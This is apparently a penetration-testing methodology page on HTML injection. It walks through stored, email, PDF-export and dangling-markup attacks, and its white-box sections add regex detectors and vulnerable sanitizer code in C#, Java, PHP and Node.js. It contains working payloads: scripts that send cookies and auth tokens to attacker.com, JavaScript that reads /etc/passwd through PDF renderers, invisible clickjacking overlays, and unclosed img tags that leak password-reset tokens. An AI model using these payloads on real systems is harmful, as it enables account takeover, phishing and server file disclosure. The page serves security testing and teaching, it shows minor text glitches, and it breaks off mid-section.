# HTML Injection

## Check List

## Methodology

### Black Box

#### Stored

{% stepper %}
{% step %}
Go to any page that has a user-editable rich text field ticket or description, comment, bio
{% endstep %}

{% step %}
Enter normal text like `test <b>bold</b>` test and submit
{% endstep %}

{% step %}
View the saved content with another user or in private mode, if bold renders as bold text, limited HTML is allowed
{% endstep %}

{% step %}
Intercept the save/create request with Burp Suite and send to Repeater
{% endstep %}

{% step %}
In the parameter that contains the user input and replace the value with this breakout + overlay payload

```html
"><div style="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,1);z-index:2147483647;"></div>
```
{% endstep %}

{% step %}
If ظthe input is already inside a tag wrapped in \<p> use this version

```html
</p><div style="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,1);z-index:2147483647;"></div><p>
```
{% endstep %}

{% step %}
Send the request and let the content be saved
{% endstep %}

{% step %}
Log in as a different user or open incognito/private window and visit any page that displays the saved content dashboard, ticket list, profile page, forum thread,&#x20;
{% endstep %}

{% step %}
If the entire screen becomes completely black and nothing is clickable Full visual defacement via Stored HTML Injection with style attribute is confirmed
{% endstep %}

{% step %}
Works on every platform that uses whitelist-based HTML Sanitization and allows the `<style>` attribute on `<div>, <h1>, <b>, <i>, <a>,`&#x20;
{% endstep %}
{% endstepper %}

***

#### **Email HTML Injection** <a href="#bb11" id="bb11"></a>

{% stepper %}
{% step %}
Go to any property valuation, booking request, or contact form that sends user input to an email template
{% endstep %}

{% step %}
Fill the form normally (especially the address or street, city field and intercept the POST request with Burp Suite
{% endstep %}

{% step %}
Send the request to Repeater
{% endstep %}

{% step %}
In the JSON body, locate the address-related fields commonly `street`, `formattedAddress`, address, location, city
{% endstep %}

{% step %}
Replace the street or `formattedAddress` value with your attacker-controlled URL For Example

```json
"street": "https://attacker.com",
"formattedAddress": "https://attacker.com"
```
{% endstep %}

{% step %}
Full example payload works on any similar endpoint

```json
{
  "address": {
    "street": "https://attacker.com",
    "formattedAddress": "https://attacker.com",
    "city": "Click here for your free valuation",
    "postalCode": "https://attacker.com"
  },
  "email": "victim@company.com",
  "name": "Please click the link below"
}
```
{% endstep %}

{% step %}
Send the request – it will succeed (no 403 if the field is not validated)
{% endstep %}

{% step %}
Wait for the confirmation or booking email to be sent to the `admin/agent/staff`
{% endstep %}

{% step %}
When the victim (employee) opens the email, the address field will be rendered as a clickable link pointing to `https://attacker.com`
{% endstep %}

{% step %}
If the victim clicks it Successful Email Template Content Spoofing Phishing via Trusted Domain confirmed
{% endstep %}
{% endstepper %}

***

#### Email Invite Manipulation

{% stepper %}
{% step %}
Log in to your account on `target.com`
{% endstep %}

{% step %}
Navigate to your project settings page
{% endstep %}

{% step %}
Change your **project name** to a payload such as

```html
<img src="https://miro.app.com/v2/resize:fit:720/format:webp/0*y2OAF_DSarBAjihO.jpg">
```
{% endstep %}

{% step %}
Go to the Invite Members section and send an email invitation to any email address you control
{% endstep %}

{% step %}
Open the received email
{% endstep %}

{% step %}
You will notice that the HTML image is rendered **inline in the email body**, proving successful injection
{% endstep %}
{% endstepper %}

***

#### Account Takeover

{% stepper %}
{% step %}
Go to your profile/shop bio or any field that allows limited HTML&#x20;
{% endstep %}

{% step %}
Enter this exact HTML structure and save it

```html
<div class="remote-pagination-container">
<div class="pagination">
<a href="/cloudinary/images/your_image_id?options[delivery_type]=upload">Next page →</a>
</div>
</div>
```
{% endstep %}

{% step %}
Upload any valid image to the site (via avatar, product image, shop banner anywhere that uses `Cloudinary`
{% endstep %}

{% step %}
After upload, grab the image ID from the final URL usually looks like `s--AbCdEfGh--`/v1234567890/image\_name.jpg → your\_image\_id = `s--AbCdEfGh--`)
{% endstep %}

{% step %}
Replace `your_image_id` in the href above with your real Cloudinary image ID
{% endstep %}

{% step %}
Use a hex editor (https://hexed.it or local tool) to open your original image file
{% endstep %}

{% step %}
Go to offset `0x1A` (or any safe location after JPEG headers) and insert your XSS payload exactly like this

```html
<script>fetch('https://attacker.com/steal?token='+localStorage.getItem('auth_token')+'&cookie='+document.cookie)</script>Save the modified image as new file (still valid JPEG)
```
{% endstep %}

{% step %}
Save the modified image as new file (still valid JPEG)
{% endstep %}

{% step %}
Update your bio HTML with the new image ID and exact parameter`options[delivery_type]=upload`
{% endstep %}

{% step %}
Final working bio payload

```html
<div class="remote-pagination-container">
<div class="pagination">
<a href="/cloudinary/images/s--NewMaliciousID--/?options[delivery_type]=upload">Next →</a>
</div>
</div>
```
{% endstep %}

{% step %}
Save the bio and Now go to any victim's shop page or wait for anyone to view your shop/profile
{% endstep %}

{% step %}
When they click the "Next page →" link → `jQuery replaceWith()` loads your raw image bytes via same-origin → your embedded executes → localStorage token + cookies stolen → Account Takeover achieved
{% endstep %}
{% endstepper %}

***

#### Send Message Functionality HTML Injection to Server Side Request Forgery

{% stepper %}
{% step %}
Log into the target site and check if there is a point in the application that sends a message to another user or as an email, and find the Send Message functionality or Email Form
{% endstep %}

{% step %}
Enter a normal email like `test@example.com` and submit the form
{% endstep %}

{% step %}
Intercept the `POST` request with Burp Suite and send to Repeater
{% endstep %}

{% step %}
In the email parameter, replace the value with this exact payload

```javascript
<script>alert(1)</script>
```
{% endstep %}

{% step %}
Send the request and check if the alert pops or if the script renders
{% endstep %}

{% step %}
If no alert but the field allows injection without @ symbol, try a basic HTML breakout
{% endstep %}

{% step %}
Send and refresh the page or view as another user and if Hello renders, HTML Injection confirmed Then escalate with an external image load

```html
hello"><h1><img src="https://miro.medium.com/v2/resize:fit:1400/0*y2OAF_DSarBAjihO.jpg"></h1>
```
{% endstep %}

{% step %}
If the image loads from third-party, SSRF potential confirmed
{% endstep %}

{% step %}
Then use Burp Collaborator for IP exfiltration

```html
hello"><h1><img src="https://*.burpcollaborator.net/hacked.jpg"></h1>
```
{% endstep %}

{% step %}
Submit and check Burp Collaborator for `HTTP/DNS` interactions,if callback received, SSRF + CSRF via IP leak confirmed
{% endstep %}

{% step %}
Test the email parameter on other input endpoints like `/contact`, `/feedback`, `/reset`, `/signup`, or `/profile` as they often reflect input without @ validation
{% endstep %}
{% endstepper %}

***

#### Server File Reading via PDF Export

{% stepper %}
{% step %}
Go to any file upload feature that supports PDF export like reports, invoices, profiles, documents, attachments
{% endstep %}

{% step %}
Upload a normal file with a safe name like `test.pdf`
{% endstep %}

{% step %}
Trigger PDF generation and download the file, open it to confirm filename appears inside
{% endstep %}

{% step %}
Intercept the upload POST request with Burp Suite and send to Repeater
{% endstep %}

{% step %}
In the filename parameter replace the value with this HTML breakout payload

```html
"><h1>XSS Test</h1>
```
{% endstep %}

{% step %}
Send the request and generate a new PDF
{% endstep %}

{% step %}
Open the PDF, if \<h1>XSS Test\</h1> renders As large text, HTML Injection into PDF template confirmed
{% endstep %}

{% step %}
Then escalate with this JavaScript LFI payload (works in `wkhtmltopdf`, `Chrome PDF`, etc.)

```html
"><script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
```
{% endstep %}

{% step %}
Or for Windows servers

```html
"><script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///C:/Windows/system.ini");x.send();</script>
```
{% endstep %}

{% step %}
Generate the PDF again and open it, If `/etc/passwd` or `system.ini` contents are printed inside the PDF, Critical Local File Inclusion (LFI) via PDF HTML Injection confirmed
{% endstep %}

{% step %}
Then read other sensitive files

* `file:///etc/hosts`
* `file:///proc/version`
* `file:///var/www/html/config.php`
{% endstep %}
{% endstepper %}

***

#### HTML injection in search UI

{% stepper %}
{% step %}
Log in to the application using a low-privilege user account
{% endstep %}

{% step %}
Access the "`Contacts`" section and initiate the creation of a new Circle
{% endstep %}

{% step %}
When naming the Circle, insert the following payload:

&#x20;`<meta http-equiv="refresh" content="2; https://evil.com/" />`
{% endstep %}

{% step %}
Share the Circle with a user account having an `"Admin"` role
{% endstep %}

{% step %}
Observe that the browser will redirect to a malicious website within a 2-second timeframe
{% endstep %}
{% endstepper %}

***

### White Box

#### Contextual UI Redressing via Sanitizer Namespace Confusion and Global CSS Utility Inheritance

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on Customer Support portals, IT Service Management (ITSM) platforms, or internal Administrative dashboards (e.g., Zendesk, Jira, ServiceNow) where external users can submit rich-text tickets reviewed by internal administrators.
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the backend HTML sanitization pipeline used for rich-text processing
{% endstep %}

{% step %}
Identify the "Robust XSS Sanitization" architecture. To prevent Stored XSS from compromising high-privilege support agents, the backend developer routes all incoming ticket payloads through an enterprise-grade HTML Sanitizer (e.g., DOMPurify, OWASP Java HTML Sanitizer, HtmlSanitizer)
{% endstep %}

{% step %}
Investigate the Sanitizer configuration constraints. The business requires users to submit heavily formatted tickets (tables, bold text, colored spans, and functional hyperlinks). To satisfy this, the sanitizer strips all `<script>`, `<iframe>`, and event handlers, but explicitly permits structural tags (e.g., `<a>`, `<div>`, `<span>`) and safe attributes (e.g., `href`, `class`)
{% endstep %}

{% step %}
Analyze the frontend presentation layer. Modern enterprise dashboards universally employ global CSS utility frameworks (e.g., Tailwind CSS, Bootstrap, or custom utility classes) to rapidly construct UI components. These frameworks inject thousands of global CSS classes directly into the primary DOM namespace
{% endstep %}

{% step %}
Discover the fatal boundary oversight: The backend developer equates "Absence of JavaScript" with "Inability to execute malicious actions." They assume that because the HTML is structurally inert, it cannot harm the administrative viewer. They fundamentally fail to restrict the `class` attribute namespace
{% endstep %}

{% step %}
Understand the vulnerability: By permitting the `class` attribute, the sanitizer allows the injected HTML to arbitrarily inherit the highly privileged global CSS rules defined by the enterprise platform
{% endstep %}

{% step %}
Formulate the UI Redressing (Clickjacking) payload. You must construct a purely structural HTML payload that utilizes the platform's own CSS utility classes to break out of the ticket's bounding box and invisibly overlay a malicious hyperlink across the administrator's screen
{% endstep %}

{% step %}
Identify the CSS utility classes used by the platform (e.g., inspecting the DOM to find Tailwind classes like `fixed`, `inset-0`, `w-screen`, `h-screen`, `z-[9999]`, `opacity-0`)
{% endstep %}

{% step %}
Construct the payload: `<a href="[https://attacker.com/admin-phish](https://attacker.com/admin-phish)" class="fixed inset-0 w-screen h-screen z-[9999] opacity-0">invisible</a>`
{% endstep %}

{% step %}
Submit the ticket to the support queue
{% endstep %}

{% step %}
The backend HTML Sanitizer evaluates the payload. `<a>` is an allowed tag. `href` is an allowed attribute. `class` is an allowed attribute. The sanitizer mathematically proves no XSS exists and saves the payload
{% endstep %}

{% step %}
The internal Support Administrator opens the ticket. The frontend SPA renders the sanitized HTML. The browser reads the `class` attribute, applies the platform's global CSS utilities, and stretches the transparent anchor tag across the entire viewport
{% endstep %}

{% step %}
The Support Administrator attempts to click the native "Approve Refund" or "Close Ticket" button. Because the transparent HTML element overlays the entire Z-axis, the click is intercepted by the anchor tag, seamlessly routing the administrator's active session to the attacker's phishing portal or triggering a cross-site GET state mutation

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(\.AllowAttributes\(\s*"class"\s*\)\.OnElements\()|(\.AllowAttributes\(\s*"class"\s*\))|(\.OnElements\([^)]*\))|(\.AllowAttributes\([^)]*"class"[^)]*\))
```
{% endtab %}

{% tab title="Java" %}
```regexp
(policyFactory\.allowAttributes\(\s*"class"\s*\)\.globally\(\))|(allowAttributes\(\s*"class"\s*\))|(\.globally\(\))
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(\$config->set\(\s*'HTML\.Allowed'\s*,\s*'.*class.*'\s*\))|(\$config->set\(\s*["']HTML\.Allowed["'])|(\$config->set\([^)]*class[^)]*\))
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(sanitizeHtml\([^)]*allowedAttributes\s*:\s*\{[\s\S]*'class')|(allowedAttributes\s*:\s*\{[\s\S]*['"]class['"])|(allowedAttributes\s*:\s*\{[\s\S]*['"]\*['"]\s*:\s*\[[^\]]*['"]class['"])
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\.AllowAttributes\(\s*"class"\s*\)\.OnElements\(|\.AllowAttributes\(\s*"class"\s*\)|\.AllowAttributes\(.*class
```
{% endtab %}

{% tab title="Java" %}
```regexp
policyFactory\.allowAttributes\(\s*"class"\s*\)\.globally\(\)|allowAttributes\(\s*"class"\s*\)|\.globally\(
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$config->set\(\s*'HTML\.Allowed'\s*,\s*'.*class.*'|\$config->set\(.*HTML\.Allowed.*class
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
sanitizeHtml\(.*allowedAttributes.*class|allowedAttributes\s*:\s*\{.*['"]class['"]|allowedAttributes\s*:\s*\{.*['"]\*['"]\s*:\s*\[.*['"]class['"]
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class TicketSanitizationService
{
    private readonly HtmlSanitizer _sanitizer;

    public TicketSanitizationService()
    {
        _sanitizer = new HtmlSanitizer();
        
        // [1]
        // [2]
        _sanitizer.AllowedTags.Add("div");
        _sanitizer.AllowedTags.Add("span");
        _sanitizer.AllowedTags.Add("a");
        
        // [3]
        // [4]
        // Developer assumes that because 'script' and 'style' tags are blocked, 
        // passing 'class' attributes is perfectly safe.
        _sanitizer.AllowedAttributes.Add("class");
    }

    public string SanitizeTicketHtml(string rawHtml)
    {
        return _sanitizer.Sanitize(rawHtml);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Service
public class TicketSanitizationService {

    // [1]
    // [2]
    // Enterprise HTML sanitizer explicitly configured to allow styling and layout
    private final PolicyFactory policy = new HtmlPolicyBuilder()
            .allowElements("a", "div", "span", "p", "b", "i", "table", "tr", "td")
            .allowUrlProtocols("https", "http")
            .allowAttributes("href").onElements("a")
            // [3]
            // [4]
            // The fatal flaw: permitting the 'class' attribute without validating its contents
            .allowAttributes("class").globally()
            .toFactory();

    public String sanitizeTicketHtml(String rawHtml) {
        // Removes all JavaScript, completely neutralizing standard XSS
        return policy.sanitize(rawHtml);
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class TicketSanitizationService
{
    public function sanitizeTicketHtml(string $rawHtml): string
    {
        // [1]
        // [2]
        $config = \HTMLPurifier_Config::createDefault();
        
        // [3]
        // [4]
        // Explicitly enables the class attribute on structural elements
        $config->set('HTML.Allowed', 'a[href|class],div[class],span[class],p,b,i');
        
        $purifier = new \HTMLPurifier($config);
        
        return $purifier->purify($rawHtml);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
const sanitizeHtml = require('sanitize-html');

class TicketSanitizationService {
    static sanitizeTicketHtml(rawHtml) {
        // [1]
        // [2]
        return sanitizeHtml(rawHtml, {
            allowedTags: [ 'b', 'i', 'em', 'strong', 'a', 'div', 'p', 'span' ],
            allowedAttributes: {
                'a': [ 'href' ],
                // [3]
                // [4]
                // Blindly allows all CSS classes
                '*': [ 'class' ]
            },
            allowedSchemes: [ 'http', 'https' ]
        });
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The application ingests untrusted rich-text payloads from external users and renders them within highly trusted internal administrative environments, \[2] To prevent devastating Stored XSS attacks, the architecture routes the payload through a strict, battle-tested HTML sanitization library, removing all dynamic execution vectors, \[3] To preserve the formatting and layout required for complex support tickets, the sanitizer is configured to permit the `class` attribute, \[4] The execution sink. The backend developer evaluates HTML safety purely within the context of the HTML specification. They fail to recognize that the frontend SPA utilizes a global CSS utility framework (like Tailwind). By injecting specific utility classes into an allowed tag, the attacker breaks out of the ticket's physical bounding box. The browser applies the enterprise's own trusted CSS rules to the attacker's anchor tag, stretching it invisibly across the entire administrative dashboard, perfectly intercepting clicks and enabling robust UI Redressing without executing a single line of JavaScript

```http
// 1. Attacker inspects the enterprise dashboard and notices it utilizes Tailwind CSS.
// 2. Attacker submits a new Support Ticket containing the structural UI Redressing payload.

POST /api/v1/support/tickets HTTP/1.1
Host: support.enterprise.tld
Authorization: Bearer <attacker_token>
Content-Type: application/json

{
  "subject": "System Error in Billing",
  "bodyHtml": "<p>Please review my account.</p><a href='https://evil.com/admin-phish' class='fixed inset-0 w-screen h-screen z-[9999] opacity-0 cursor-default'>Click Interceptor</a>"
}

// 3. The backend HTML Sanitizer verifies <a>, <p>, 'href', and 'class' are allowed.
// 4. The payload is persisted to the database.

// 5. The Support Administrator opens the ticket in the internal dashboard.
// 6. The frontend renders the HTML.
// 7. The browser engine parses `fixed inset-0 w-screen h-screen z-[9999] opacity-0`.
// 8. The transparent anchor tag detaches from the document flow and overlays the entire viewport.
// 9. The Administrator moves their mouse to click the "Issue Refund" button.
// 10. The click registers on the invisible <a> tag, immediately navigating the admin's session 
//     to the attacker's credential harvesting portal.
```
{% endstep %}

{% step %}
To allow rich communication while mitigating Stored XSS, engineers deployed strict server-side HTML sanitization pipelines. This defense model equated JavaScript elimination with absolute structural safety. Developers explicitly authorized the `class` attribute to maintain basic visual fidelity, assuming CSS was contextually bound to the rendering container. The vulnerability emerged from a namespace collision between the sanitized HTML and the frontend's global CSS utility framework. The attacker bypassed the backend's logical intent by supplying perfectly legitimate HTML tags decorated with the enterprise's own highly privileged CSS classes. When rendered, the browser honored the cascading stylesheets, breaking the element out of its localized container and overlaying it across the entire administrative viewport. This structural injection successfully weaponized the application's presentation layer against its operators, executing a seamless Clickjacking attack within a single, trusted origin
{% endstep %}
{% endstepper %}

***

#### Token Exfiltration via Sequential Concatenation in Dangling Markup

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on asynchronous communication pipelines where tenant-provided data is concatenated with highly sensitive system data (e.g., Transactional Email engines, PDF Invoice generators, or automated SMS dispatchers)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application's rendering and dispatch sequence
{% endstep %}

{% step %}
Identify the "Template Concatenation" architecture. In B2B platforms, enterprise tenants can customize the "Welcome" or "Password Reset" emails sent to their users. To accomplish this, the backend stores the tenant's Custom HTML Body in the database
{% endstep %}

{% step %}
Investigate the Email Dispatch pipeline. When a user requests a password reset, the backend initiates the email assembly. It fetches the tenant's Custom HTML Body, sanitizes it to remove malicious scripts, and then sequentially concatenates the system's sensitive data (e.g., the secure Password Reset URL, un-hashed authentication tokens, or one-time passwords) directly _below_ the tenant's HTML
{% endstep %}

{% step %}
Analyze the Sanitization logic. Because standard email clients (Outlook, Gmail) strip JavaScript natively, the backend developer uses a lightweight HTML sanitizer that allows structural tags (e.g., `<img src="...">`, `<a href="...">`, `<table>`)
{% endstep %}

{% step %}
Discover the fatal validation gap: The backend sanitizer parses the HTML utilizing a strict DOM tree representation to ensure the tags are safe. However, after sanitization, the backend uses raw string concatenation to append the sensitive system token (e.g., `$finalEmail = $tenantHtml . "<br>Reset Link: " . $secureToken;`)
{% endstep %}

{% step %}
Understand the Dangling Markup vulnerability: HTML parsers in client applications (like browsers or email clients) are notoriously fault-tolerant. If an HTML tag opens an attribute with a quote (e.g., `src='`) but fails to close it, the parser will continue consuming all subsequent plaintext in the document until it encounters the next matching quote
{% endstep %}

{% step %}
Formulate the Exfiltration payload. You must supply a custom HTML body containing an unclosed tag that instructs the client to execute an outbound HTTP request (e.g., an `<img>` or `<style>` tag)
{% endstep %}

{% step %}
Construct the payload: `<img src='[https://attacker.com/leak?data=](https://attacker.com/leak?data=)`. Note the deliberate omission of the closing single quote and angle bracket
{% endstep %}

{% step %}
Authenticate to the Tenant Administration dashboard and update the Custom Email Template with your payload
{% endstep %}

{% step %}
The backend sanitizer attempts to parse your payload. Depending on the library, it may "auto-correct" the tag by appending the closing quote. If it does not auto-correct (or if you exploit parser differentials between the sanitizer and the email client), the unclosed string is saved to the database
{% endstep %}

{% step %}
Trigger the dispatch event (e.g., initiate a Password Reset for a target user)
{% endstep %}

{% step %}
The backend concatenates your malicious, unclosed HTML with the highly sensitive system token and dispatches the email44
{% endstep %}

{% step %}
The victim's email client receives the HTML. It parses `<img src='[https://attacker.com/leak?data=](https://attacker.com/leak?data=)`. Searching for the closing quote, it eagerly consumes the system's concatenated text: `<br>Reset Link: [https://enterprise.tld/reset?token=SECRET_XYZ](https://enterprise.tld/reset?token=SECRET_XYZ)`
{% endstep %}

{% step %}
The email client attempts to render the image, issuing an HTTP GET request to `[https://attacker.com/leak?data=](https://attacker.com/leak?data=)<br>Reset Link: [https://enterprise.tld/reset?token=SECRET_XYZ](https://enterprise.tld/reset?token=SECRET_XYZ)`. The attacker perfectly intercepts the secure, out-of-band communication token without executing a single line of JavaScript

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(string\s+\w+\s*=\s*\w*Template\s*\+\s*\$"<a[^>]*\{[^}]+\})|(emailBuilder\s*\.\s*Append\s*\(\s*\w*Template\s*\)\s*\.Append\s*\(\s*\w*(?:Token|Secret|Key|Link|Url)\s*\))|(\w*Template\s*\+\s*\w*(?:Token|Secret|Key|ResetLink|MagicLink))
```
{% endtab %}

{% tab title="Java" %}
```regexp
(String\s+\w+\s*=\s*\w*Template\s*\+\s*.*(?:token|secret|link))|(emailBuilder\.append\(\w*Template\)\.append\(\w*(?:Token|Secret|Key|Link|Url)\))|(append\(\w*Template\)\.append\([^)]*(?:Token|Secret|Link)\))
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(\$\w+\s*=\s*\$\w*Template\s*\.\s*.*\.\s*\$\w*(?:Token|Secret|Key|Link))|(\$finalHtml\s*=\s*\$[A-Za-z_][A-Za-z0-9_]*Template\s*\.)|(\.\s*\$(?:resetLink|magicLink|token|secret|apiKey))
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(let\s+\w+\s*=\s*`\$\{\w*Template\}[\s\S]*\$\{(?:token|secret|resetLink|magicLink|apiKey|secureToken)\}`)|(const\s+\w+\s*=\s*`\$\{\w*Template\}[\s\S]*\$\{(?:token|secret|link)\}`)|(\$\{\w*Template\}[\s\S]*\$\{(?:secureToken|resetLink|magicLink)\})
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\w*Template\s*\+\s*\w*(Token|Secret|Key|ResetLink|MagicLink)|emailBuilder\.Append\(.*Template.*\)\.Append\(.*(Token|Secret|Link)
```
{% endtab %}

{% tab title="Java" %}
```regexp
emailBuilder\.append\(.*Template.*\)\.append\(.*(Token|Secret|Key|Link)|String\s+\w+\s*=.*Template.*(token|secret|link)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$[A-Za-z_][A-Za-z0-9_]*Template\s*\..*\$(Token|Secret|Key|resetLink|magicLink)|\$finalHtml\s*=.*Template
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\$\{.*Template\}.*\$\{(token|secret|resetLink|magicLink|secureToken)\}|let\s+\w+\s*=.*secureToken
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class EmailDispatchService
{
    public async Task SendPasswordResetAsync(User user, string resetToken)
    {
        // [1]
        // [2]
        var tenantConfig = await _dbContext.TenantConfigs.FindAsync(user.TenantId);
        var customHtml = _htmlSanitizer.Sanitize(tenantConfig.EmailTemplate);

        // [3]
        // [4]
        // The HTML structure is finalized via raw string concatenation.
        var sb = new StringBuilder();
        sb.Append(customHtml);
        sb.Append("<br><br>Please reset your password using this secure token: ");
        sb.Append(resetToken);

        await _smtpClient.SendHtmlEmailAsync(user.Email, "Reset Password", sb.ToString());
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Service
public class EmailDispatchService {

    @Autowired
    private TenantConfigRepository configRepo;
    @Autowired
    private EmailProvider emailProvider;

    public void sendPasswordReset(User user, String resetToken) {
        // [1]
        // [2]
        TenantConfig config = configRepo.findById(user.getTenantId()).orElseThrow();
        String customHtml = sanitizeHtml(config.getCustomEmailBody());

        // [3]
        // [4]
        // The system token is physically adjacent to the untrusted, unclosed tag.
        String finalEmailBody = customHtml + 
                "<br/><br/>Your secure reset token is: <strong>" + resetToken + "</strong>";

        emailProvider.sendHtmlEmail(user.getEmail(), "Password Reset", finalEmailBody);
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class EmailDispatchService
{
    public function sendPasswordReset($user, $resetToken)
    {
        // [1]
        // [2]
        $tenantTemplate = DB::table('tenant_settings')->where('id', $user->tenant_id)->value('email_body');

        // [3]
        // [4]
        // Developer assumes the tenant template is completely isolated from the system string.
        // If the tenant template ends with an unclosed HTML attribute (e.g., <img src="http://evil.com/leak?),
        // the client's HTML parser will absorb the subsequent sensitive string into the outbound URL.
        $finalHtml = $tenantTemplate . "<br><br><b>Secure Reset Link:</b> https://auth.enterprise.tld/reset?token=" . $resetToken;

        Mail::to($user->email)->send(new ResetPasswordMail($finalHtml));
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class EmailDispatchService {
    static async sendPasswordReset(user, resetToken) {
        // [1]
        // [2]
        let tenantConfig = await TenantConfig.findByPk(user.tenantId);
        let customHtml = sanitizeHtml(tenantConfig.customEmailBody);

        // [3]
        // [4]
        // String interpolation inherently merges the trust boundaries.
        // The unclosed tag in 'customHtml' overflows into the secure token string.
        let finalEmailBody = `
            <div>${customHtml}</div>
            <hr>
            <p>Click here to reset your password: https://auth.enterprise.tld/reset?t=${resetToken}</p>
        `;

        await emailProvider.send({
            to: user.email,
            subject: 'Password Reset',
            html: finalEmailBody
        });
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture delegates branding and formatting authority to individual enterprise tenants, allowing them to supply custom HTML templates for system-generated emails, \[2] To enforce basic security, the backend retrieves the tenant's HTML and passes it through an HTML Sanitizer, ensuring `<script>` tags and known malicious payloads are stripped before dispatch, \[3] The architecture relies on sequential concatenation to merge the tenant's cosmetic content with the system's highly sensitive, operational data (the cryptographic reset token), \[4] The execution sink. The backend developer evaluates HTML purely as a collection of discrete, closed nodes. They fail to account for the fault-tolerant nature of client-side HTML parsers (like Apple Mail, Gmail, or Chromium). When the attacker intentionally supplies a syntactically malformed, unclosed tag (Dangling Markup), the client's parser actively attempts to repair the document structure by greedily consuming all subsequent text until a matching quote is found. This forces the client application to unknowingly embed the highly classified system token into the query parameters of the attacker's outbound image request, flawlessly exfiltrating the data out-of-band

```http
// 1. Attacker (Tenant Admin) navigates to their tenant customization dashboard.
// 2. Attacker submits a custom email template. The payload omits the closing single quote.

POST /api/v1/tenant/settings/email-template HTTP/1.1
Host: admin.enterprise.tld
Authorization: Bearer <tenant_admin_token>
Content-Type: application/json

{
  "templateHtml": "<h1>Welcome to our platform!</h1><p>We are glad you are here.</p><img src='https://attacker.com/leak?data="
}

// 3. The backend sanitizer attempts to process the HTML. Many standard sanitizers 
//    allow unclosed quotes if the tag itself isn't explicitly malicious.
// 4. The backend saves the template.

// 5. Attacker navigates to the public login portal and initiates a Password Reset 
//    for the target victim (a Super Admin within that tenant).
POST /api/v1/auth/forgot-password HTTP/1.1
Host: auth.enterprise.tld
Content-Type: application/json

{"email": "super.admin@victim.com"}

// 6. The backend concatenates the template and the system token:
// <h1>...</h1><img src='https://attacker.com/leak?data=<br>Reset Token: SECURE_998811

// 7. The victim's email client (e.g., Outlook) receives the HTML.
// 8. The client parses the <img> tag. It absorbs "<br>Reset Token: SECURE_998811" into the 'src' attribute.
// 9. The email client renders the image, making a silent HTTP GET request:
//    GET /leak?data=<br>Reset Token: SECURE_998811 HTTP/1.1
//    Host: attacker.com

// 10. The attacker monitors their server logs, extracts the reset token, and completes the Account Takeover.
```
{% endstep %}

{% step %}
To provide white-label customization without compromising core platform security, architects deployed sequential HTML assembly pipelines, separating untrusted tenant cosmetic data from sensitive system operational data. This defense model relied on the strict assumption that string concatenation inherently preserved the logical isolation of the two data blocks. The vulnerability emerged from a deep misunderstanding of client-side HTML parsing heuristics. Web and email clients prioritize rendering over structural integrity, actively attempting to repair malformed markup. The attacker exploited this fault tolerance by injecting an unclosed HTML attribute (Dangling Markup) into the cosmetic payload. When the backend blindly concatenated the sensitive reset token below it, the client-side parser seamlessly absorbed the classified system data into the attacker's outbound network request attribute. This structural collapse successfully transformed an ostensibly inert HTML injection flaw into a pristine, cross-boundary data exfiltration vector
{% endstep %}
{% endstepper %}

***

#### Edge-Side Request Forgery via ESI Tag Injection in Cached Fragments

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on hyper-scale global content platforms, e-commerce storefronts, or media sites utilizing aggressive caching architectures (e.g., Varnish, Fastly, Akamai) combined with dynamic content generation
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the backend presentation tier and caching configuration
{% endstep %}

{% step %}
Identify the "Edge Side Includes (ESI)" architecture. Caching an entire webpage containing dynamic elements (e.g., "Welcome, Username" or an active shopping cart) is impossible. To achieve 99% cache-hit ratios, developers cache the static HTML skeleton at the CDN Edge, and embed ESI tags (e.g., `<esi:include src="/api/cart/count" />`). The CDN dynamically fetches and stitches these specific fragments into the HTML just before delivering it to the user
{% endstep %}

{% step %}
Investigate the API sanitization pipeline. The backend accepts untrusted user input (e.g., User Bios, Product Reviews, Forum Comments). To prevent standard Stored XSS, the backend passes this input through a strict HTML sanitizer, stripping all `<script>`, `<iframe>`, and JavaScript event handlers
{% endstep %}

{% step %}
Analyze the protocol desynchronization. The backend HTML sanitizer is designed exclusively to evaluate HTML/XML according to W3C DOM specifications. It has zero awareness of Edge-specific namespaces or CDN execution directives
{% endstep %}

{% step %}
